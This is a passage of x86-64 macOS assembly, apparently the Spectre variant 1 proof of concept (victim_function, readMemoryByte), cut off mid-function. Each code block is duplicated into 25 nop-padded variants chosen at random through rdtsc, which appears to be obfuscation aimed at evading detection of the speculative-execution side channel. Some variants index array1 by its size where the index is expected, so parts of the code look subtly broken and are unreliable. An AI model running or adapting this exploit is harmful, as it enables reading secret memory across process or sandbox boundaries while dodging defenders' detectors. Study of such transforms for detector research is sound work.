	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_victim_function                ## -- Begin function victim_function
	.p2align	4, 0x90
_victim_function:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movl	_array1_size(%rip), %ecx
                                        ## kill: def $rcx killed $ecx
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_function_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_function_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_function_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_function_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_function_win0_var4
	cmpl	$5, %eax
	je	.Lvictim_function_win0_var5
	cmpl	$6, %eax
	je	.Lvictim_function_win0_var6
	cmpl	$7, %eax
	je	.Lvictim_function_win0_var7
	cmpl	$8, %eax
	je	.Lvictim_function_win0_var8
	cmpl	$9, %eax
	je	.Lvictim_function_win0_var9
	cmpl	$10, %eax
	je	.Lvictim_function_win0_var10
	cmpl	$11, %eax
	je	.Lvictim_function_win0_var11
	cmpl	$12, %eax
	je	.Lvictim_function_win0_var12
	cmpl	$13, %eax
	je	.Lvictim_function_win0_var13
	cmpl	$14, %eax
	je	.Lvictim_function_win0_var14
	cmpl	$15, %eax
	je	.Lvictim_function_win0_var15
	cmpl	$16, %eax
	je	.Lvictim_function_win0_var16
	cmpl	$17, %eax
	je	.Lvictim_function_win0_var17
	cmpl	$18, %eax
	je	.Lvictim_function_win0_var18
	cmpl	$19, %eax
	je	.Lvictim_function_win0_var19
	cmpl	$20, %eax
	je	.Lvictim_function_win0_var20
	cmpl	$21, %eax
	je	.Lvictim_function_win0_var21
	cmpl	$22, %eax
	je	.Lvictim_function_win0_var22
	cmpl	$23, %eax
	je	.Lvictim_function_win0_var23
	cmpl	$24, %eax
	je	.Lvictim_function_win0_var24
	jmp	.Lvictim_function_win0_var0
## Variant 0
.Lvictim_function_win0_var0:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 1
.Lvictim_function_win0_var1:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 2
.Lvictim_function_win0_var2:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 3
.Lvictim_function_win0_var3:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	nop
	leaq	(%rax,%rcx), %r10
	movzbl	(%r10), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 4
.Lvictim_function_win0_var4:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	nop
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 5
.Lvictim_function_win0_var5:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	leaq	(%rax,%rcx), %r10
	movzbl	(%r10), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 6
.Lvictim_function_win0_var6:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	leaq	(%rax,%rcx), %r10
	movzbl	(%r10), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 7
.Lvictim_function_win0_var7:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	leaq	(%rax,%rcx), %r10
	nop
	movzbl	(%r10), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 8
.Lvictim_function_win0_var8:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 9
.Lvictim_function_win0_var9:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 10
.Lvictim_function_win0_var10:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	nop
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	leaq	(%rax,%rcx), %r10
	movzbl	(%r10), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 11
.Lvictim_function_win0_var11:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 12
.Lvictim_function_win0_var12:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
	nop
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 13
.Lvictim_function_win0_var13:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 14
.Lvictim_function_win0_var14:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
	nop
	xorq	%r11, %r11
	nop
	cmovb	%rcx, %r11
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 15
.Lvictim_function_win0_var15:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 16
.Lvictim_function_win0_var16:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	leaq	(%rax,%rcx), %r10
	movzbl	(%r10), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 17
.Lvictim_function_win0_var17:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	leaq	(%rax,%rcx), %r10
	movzbl	(%r10), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 18
.Lvictim_function_win0_var18:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 19
.Lvictim_function_win0_var19:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 20
.Lvictim_function_win0_var20:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 21
.Lvictim_function_win0_var21:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 22
.Lvictim_function_win0_var22:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	nop
	nop
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 23
.Lvictim_function_win0_var23:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	leaq	-8(%rbp), %r10
	movq	(%r10), %rcx
	leaq	_array1(%rip), %rax
	nop
	leaq	(%rax,%rcx), %r10
	movzbl	(%r10), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 24
.Lvictim_function_win0_var24:
	popq	%rax
	nop
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
	xorq	%r11, %r11
	cmovb	%rcx, %r11
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%r11), %eax
	jmp	.Lvictim_function_win0_continue
.Lvictim_function_win0_continue:
	shll	$9, %eax
	movslq	%eax, %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movzbl	(%rax,%rcx), %ecx
	movzbl	_temp(%rip), %eax
	andl	%ecx, %eax
                                        ## kill: def $al killed $al killed $eax
	movb	%al, _temp(%rip)
LBB0_2:
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_readMemoryByte                 ## -- Begin function readMemoryByte
	.p2align	4, 0x90
_readMemoryByte:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$144, %rsp
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	%rcx, -48(%rbp)
	movl	$0, -72(%rbp)
	movl	$0, -56(%rbp)
LBB1_1:                                 ## =>This Inner Loop Header: Depth=1
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win9_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win9_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win9_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win9_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win9_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win9_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win9_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win9_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win9_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win9_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win9_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win9_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win9_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win9_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win9_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win9_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win9_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win9_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win9_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win9_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win9_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win9_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win9_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win9_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win9_var24
	jmp	.LreadMemoryByte_win9_var0
## Variant 0
.LreadMemoryByte_win9_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 1
.LreadMemoryByte_win9_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 2
.LreadMemoryByte_win9_var2:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 3
.LreadMemoryByte_win9_var3:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 4
.LreadMemoryByte_win9_var4:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 5
.LreadMemoryByte_win9_var5:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 6
.LreadMemoryByte_win9_var6:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 7
.LreadMemoryByte_win9_var7:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 8
.LreadMemoryByte_win9_var8:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 9
.LreadMemoryByte_win9_var9:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 10
.LreadMemoryByte_win9_var10:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 11
.LreadMemoryByte_win9_var11:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 12
.LreadMemoryByte_win9_var12:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 13
.LreadMemoryByte_win9_var13:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 14
.LreadMemoryByte_win9_var14:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 15
.LreadMemoryByte_win9_var15:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 16
.LreadMemoryByte_win9_var16:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 17
.LreadMemoryByte_win9_var17:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 18
.LreadMemoryByte_win9_var18:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	nop
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 19
.LreadMemoryByte_win9_var19:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 20
.LreadMemoryByte_win9_var20:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 21
.LreadMemoryByte_win9_var21:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 22
.LreadMemoryByte_win9_var22:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 23
.LreadMemoryByte_win9_var23:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 24
.LreadMemoryByte_win9_var24:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movslq	(%r10), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	leaq	-56(%rbp), %r10
	movl	(%r10), %eax
	jmp	.LreadMemoryByte_win9_continue
.LreadMemoryByte_win9_continue:
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_1
LBB1_4:
	movl	$1999, -52(%rbp)    # # imm = 0x7CF
LBB1_5:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB1_7 Depth 2
                                        ##     Child Loop BB1_11 Depth 2
                                        ##       Child Loop BB1_13 Depth 3
                                        ##     Child Loop BB1_19 Depth 2
                                        ##     Child Loop BB1_26 Depth 2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$25, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win8_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win8_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win8_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win8_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win8_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win8_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win8_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win8_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win8_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win8_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win8_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win8_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win8_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win8_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win8_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win8_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win8_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win8_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win8_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win8_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win8_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win8_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win8_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win8_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win8_var24
	jmp	.LreadMemoryByte_win8_var0
## Variant 0
.LreadMemoryByte_win8_var0:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
